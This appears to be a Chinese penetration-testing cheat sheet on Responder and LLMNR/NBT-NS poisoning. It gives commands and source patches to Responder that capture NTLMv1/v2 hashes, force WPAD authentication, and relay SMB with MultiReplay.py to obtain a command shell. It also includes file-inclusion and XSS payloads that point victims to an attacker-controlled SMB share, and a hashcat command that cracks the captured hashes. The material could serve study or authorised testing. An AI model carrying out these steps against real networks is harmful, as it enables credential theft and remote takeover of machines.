### Responder/LLMNR毒害
  #### SMB协议截获
	内网中间人攻击脚本，kali内置
	监听网络接口
	>responder -I wlan0(eth0)
	指定某台机器或网段：修改/etc/responder/Responder.py中RespondTo参数。
	网段中有认证行为会捕获NTLMv2 hash
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/429.png)

	当访问一个不存在的共享时修改配置文件来解析
	Xp
	修改/usr/share/responder/servers/SMB.py定位到errorcode修改为\x71\x00\x00\xc0，删除掉/usr/share/responder/Responder.db
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/430.png)

	XP时使用\\cmd\share形式访问共享输入密码达4次会断开连接。
	定位到
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/431.png)

	修改self.ntry != 10
	Win7以上
	修改/usr/share/responder/servers/SMB.py定位到##Session Setup 3
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/432.png)

	删除掉and GrabMessageID(data)[0:1] == "\x02"，删除掉/usr/share/responder/Responder.db
	修改后可以进行解析，捕获hash，否则会报错误64
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/433.png)

	强制截取NTLMv1 hash，修改/usr/share/responder/packets.py，定位到以下参数，修改为\x15\x82\x81\xe2，修改Conf文件设置Challenge为16位固定值。
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/434.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/435.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/436.png)
  #### WPAD代理欺骗
	>responder -I eth0 -v -F 
	F参数即可开启强制WPAD认证服务抓取 hash，访问IE或重启电脑即可发送欺骗认证获得hash。
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/437.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/438.png)

	重启也可以抓到
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/439.png)
  #### Web漏洞
	内网中使用文件包含漏洞和XSS
	>Responder -I eth0 -v
	http://10.1.1.1/file.php?file=\\10.1.1.12\share
	http://10.1.1.1/xss.php?article=<img src=\\10.1.1.12\xx>
  #### SMB中继攻击
	修改/etc/responder/Responder.conf文件，配置smb和http为Off，分别开启两个对话框，使用F参数启用WPAD欺骗浏览器，使用/usr/share/responder/tools中的MultiReplay.py进行中继攻击获得目标cmdshell。
	>Responder -I eth0 -v -F
	>python MultiReplay.py -t 192.168.0.115 -u ALL
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/440.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/441.png)
  #### NTLMv2Hash破解
	使用hashcat破解 -m 5600为NTLMv2类型
	>hashcat -m 5600 pass.txt wordlists.txt
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/442.png)
